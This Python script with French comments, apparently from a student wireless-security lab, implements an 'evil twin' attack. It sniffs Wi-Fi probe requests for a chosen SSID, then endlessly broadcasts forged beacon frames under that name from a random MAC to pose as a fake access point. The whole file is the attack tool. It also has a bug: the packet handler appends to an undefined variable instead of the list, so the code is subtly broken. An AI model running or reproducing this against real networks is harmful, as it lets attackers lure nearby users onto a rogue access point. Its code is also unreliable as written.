# Python 3.7.6
#
# Auteurs: Adrien Barth, Lionel Burgbacher
# Date:    16.03.2020
# Source:  https://gist.github.com/securitytube/5291959
#          https://www.thepythoncode.com/article/create-fake-access-points-scapy
#          https://gist.github.com/dropmeaword/42636d180d52e52e2d8b6275e79484a0
#
# Description: Le script permet de créer un fake AP si l'on trouve une probe request provenant
#              du SSID passé en paramètre.

import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11ProbeReq

parser = argparse.ArgumentParser(description='Probe Request Evil Twin Attack')

#L'interface par défaut est wlan0mon
parser.add_argument("-i", "--interface", default="wlan0mon", help="Interface you want to attack")
parser.add_argument("-s", "--SSID", required=True, help="SSID to attack")
args = parser.parse_args()

ssid_list = []

def packethandler(pkt):

    #On vérifie que le paquet contient bien une probe request
    if pkt.haslayer(Dot11ProbeReq):
        if pkt.info.decode() == args.SSID:
            #Si le nom correspond, on ajoute le paquet à la liste
            ssid.append(pkt)
            print("You are going to attack : " + pkt.info.decode())


print("In progress...")
# Permet d'analyser les paquets, le timeout est arbitraire
sniff(iface=args.interface, prn=packethandler, timeout=10)

#Si la liste n'est pas vide on crée un fake AP avec le même SSID
if len(ssid_list) > 0:
    # Une nouvelle adresse MAC aléatoire
    sender_mac = RandMAC()
    # Même nom pour le nouveau SSID
    ssid = args.SSID
    # Trame 802.11
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    # On ajoute le SSID à la trame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # On crée une trame wifi avec la nouvelle configuration
    frame = RadioTap()/dot11/beacon/essid
    # Envoie la trame chaque 100 millisecondes
    sendp(frame, inter=0.1, iface=args.interface, loop=1)
#Si aucun SSID n'est trouvé, on quitte le programme
else:
    print("No SSID " + args.SSID + " Found")
    sys.exit()
